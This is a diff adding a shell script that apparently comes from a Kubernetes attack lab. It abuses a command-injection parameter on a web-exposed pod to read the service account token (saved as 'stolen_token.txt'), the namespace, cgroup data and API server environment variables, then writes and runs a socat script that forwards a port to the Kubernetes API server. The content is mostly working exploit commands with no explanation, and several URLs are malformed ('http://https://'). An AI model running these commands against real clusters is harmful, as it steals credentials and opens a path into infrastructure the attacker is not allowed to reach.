@@ -1,0 +1,34 @@
+TOKEN=$(curl -s 'http://https://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io/?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token')
+echo "$TOKEN" > stolen_token.txt
+
+curl 'http://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io/?cmd=env%20|%20grep%20KUBERNETES'
+
+# Get namespace information
+NAMESPACE=$(curl -s 'https://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io/?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/namespace')
+echo "Compromised namespace: $NAMESPACE"
+
+curl 'https://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io/?cmd=cat%20/proc/1/cgroup'
+
+# Get Kubernetes API server information
+curl 'https://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io/?cmd=env%20|%20grep%20KUBERNETES'
+
+NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
+API_PORT=6443 
+echo "Kubernetes API is running at https://$NODE_IP:$API_PORT"
+
+# Extract API server details from environment variables inside the pod
+API_SERVER=$(curl -s 'https://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io/?cmd=echo%20$KUBERNETES_SERVICE_HOST')
+echo "$API_SERVER"
+API_PORT=$(curl -s 'https://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io//?cmd=echo%20$KUBERNETES_SERVICE_PORT')
+echo "$API_PORT"
+
+curl -s 'http://https://66dbf2e46722fdb9097e9eb5-lb-315.bm-east.lab.poridhi.io/?cmd=cat > /tmp/kube-proxy.sh << EOF
+#!/bin/sh
+exec socat TCP-LISTEN:8001,fork,reuseaddr TCP:${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
+EOF
+chmod +x /tmp/kube-proxy.sh
+/tmp/kube-proxy.sh &
+'
+
+curl 'https://66dbf2e46722fdb9097e9eb5-lb-240.bm-east.lab.poridhi.io/?cmd=ls'
+
